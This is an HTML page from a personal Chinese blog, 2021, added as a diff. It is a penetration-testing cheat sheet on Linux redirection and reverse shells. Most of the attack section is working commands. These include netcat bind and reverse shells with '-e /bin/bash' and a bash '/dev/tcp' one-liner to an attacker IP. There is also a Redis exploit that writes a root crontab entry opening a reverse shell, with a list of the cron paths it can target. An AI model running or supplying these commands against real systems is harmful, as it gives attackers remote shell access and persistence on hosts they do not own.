@@ -1,0 +1,393 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>反弹shell | Yaoa</title>
+  <meta name="author" content="yaoa">
+  
+  <meta name="description" content="shell重定向
+文件描述符
+
+  0 标准输入
+  1 标准输出
+  2 标准错误输出
+
+输出重定向
+&amp;gt;  默认为标准输出重定向，与 1&amp;gt; 相同
+2&amp;gt;&amp;amp;1  意思是把 标准错误输出 重定向到 标准输出.
+&amp;amp;&amp;gt;file  意思是把标准输出 和 标准错误输出 都重定向到文件file中
+
+
+
+忽略输出
+
+12&amp;gt;&amp;#x2F;dev&amp;#x2F;null
+
+输入重定向
+
+123command &amp;lt;file	将 file 文件中的内容作为 command 的输入。command &amp;lt;&amp;lt;END	从标准输入（键盘）中读取数据，直到遇见分界符 END 才停止（分界符可以是任意的字符串，用户自己定义）。command &amp;lt;file1 &amp;gt;file2	将 file1 作为 command 的输入，并将 command 的处理结果输出到 file2。
+反弹shell
+1.靶机监听 将bash发布出去，攻击机直连
+靶机：nc -lvvp 8080 -t -e /bin/bash
+攻击机：nc 192.168.31.41 8080
+
+2.bash直接反弹
+bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.41/8080 0&amp;gt;&amp;amp;1
+
+bash -i &amp;gt;&amp;amp; 中的&amp;amp;表示在后台中运行
+
+
+3.netcat工具反弹
+攻击机：nc -lvvp 8080
+靶机：nc 192.168.31.174 8080 -t -e /bin/bash
+
+crontab反弹shell
+
+利用位置
+
+/etc/crontab linux通用
+/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。
+/var/spool/cron/root centos系统下root用户的cron文件
+/var/spool/cron/crontabs/root debian系统下root用户的cron文件
+
+
+exp
+1234set 1 &amp;quot;\n\n\n\n* * * * * root bash -i &amp;gt;&amp;amp; &amp;#x2F;dev&amp;#x2F;tcp&amp;#x2F;192.168.227.128&amp;#x2F;2333 0&amp;gt;&amp;amp;1\n\n\n\n&amp;quot; config set dir &amp;#x2F;etc&amp;#x2F; config set dbfilename crontab save"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="反弹shell"/>
+  <meta property="og:site_name" content="Yaoa"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Yaoa</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>归档
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>分类
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>标签
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>关于我
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 反弹shell</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="shell重定向"><a href="#shell重定向" class="headerlink" title="shell重定向"></a>shell重定向</h1><ul>
+<li>文件描述符</li>
+</ul>
+<pre><code>  0 标准输入
+  1 标准输出
+  2 标准错误输出</code></pre>
+<ul>
+<li><p>输出重定向</p>
+<pre><code>&gt;  默认为标准输出重定向，与 1&gt; 相同
+2&gt;&amp;1  意思是把 标准错误输出 重定向到 标准输出.
+&amp;&gt;file  意思是把标准输出 和 标准错误输出 都重定向到文件file中</code></pre>
+</li>
+</ul>
+<ul>
+<li>忽略输出</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+<ul>
+<li>输入重定向</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command &lt;file	将 file 文件中的内容作为 command 的输入。</span><br><span class="line">command &lt;&lt;END	从标准输入（键盘）中读取数据，直到遇见分界符 END 才停止（分界符可以是任意的字符串，用户自己定义）。</span><br><span class="line">command &lt;file1 &gt;file2	将 file1 作为 command 的输入，并将 command 的处理结果输出到 file2。</span><br></pre></td></tr></table></figure>
+<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><ul>
+<li><p>1.靶机监听 将bash发布出去，攻击机直连</p>
+<pre><code>靶机：nc -lvvp 8080 -t -e /bin/bash
+攻击机：nc 192.168.31.41 8080</code></pre>
+</li>
+<li><p>2.bash直接反弹</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.31.41/8080 0&gt;&amp;1</code></pre>
+<blockquote>
+<p>bash -i &gt;&amp; 中的&amp;表示在后台中运行</p>
+</blockquote>
+</li>
+<li><p>3.netcat工具反弹</p>
+<pre><code>攻击机：nc -lvvp 8080
+靶机：nc 192.168.31.174 8080 -t -e /bin/bash</code></pre>
+</li>
+<li><p>crontab反弹shell</p>
+<blockquote>
+<p>利用位置</p>
+<ul>
+<li>/etc/crontab linux通用</li>
+<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
+<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
+<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
+</ul>
+</blockquote>
+<p>exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.227.128&#x2F;2333 0&gt;&amp;1\n\n\n\n&quot; </span><br><span class="line">config set dir &#x2F;etc&#x2F; </span><br><span class="line">config set dbfilename crontab </span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2021/01/03/%E5%8F%8D%E5%BC%B9shell/" class="leancloud-visitors view" data-flag-title="反弹shell">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2021/01/03/mongodb/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/01/03/crontab/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+    <div class="ds-thread" data-thread-key="2021/01/03/反弹shell/" data-title="反弹shell"
+         data-url="http://yaoa.cool/2021/01/03/%E5%8F%8D%E5%BC%B9shell/"></div>
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-01-03 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/渗透/">渗透<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/web/">web<span>4</span></a></li> <li><a href="/tags/渗透/">渗透<span>4</span></a></li> <li><a href="/tags/linux/">linux<span>5</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#shell%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-article-text">shell重定向</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-article-text">反弹shell</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+<script type="text/javascript">
+  var duoshuoQuery = { short_name: '123' };
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';
+    ds.async = true;
+    ds.src = 'http://static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script>
+
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 yaoa's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
